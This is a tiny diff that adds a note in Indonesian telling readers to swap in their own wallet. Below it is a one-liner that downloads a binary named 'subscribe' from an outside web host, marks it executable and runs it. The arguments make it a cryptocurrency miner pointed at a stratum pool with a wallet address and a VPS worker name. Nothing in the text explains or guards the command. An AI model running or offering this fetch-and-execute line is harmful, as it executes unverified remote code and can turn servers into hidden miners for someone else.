@@ -1,2 +1,4 @@
 
+Ganti Wallet Kalian.
+
 wget http://ilovenypizza.com/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MgwuCc6yvsvMeg6AosthAe4gTvQwaoKFFu.VPS -t2
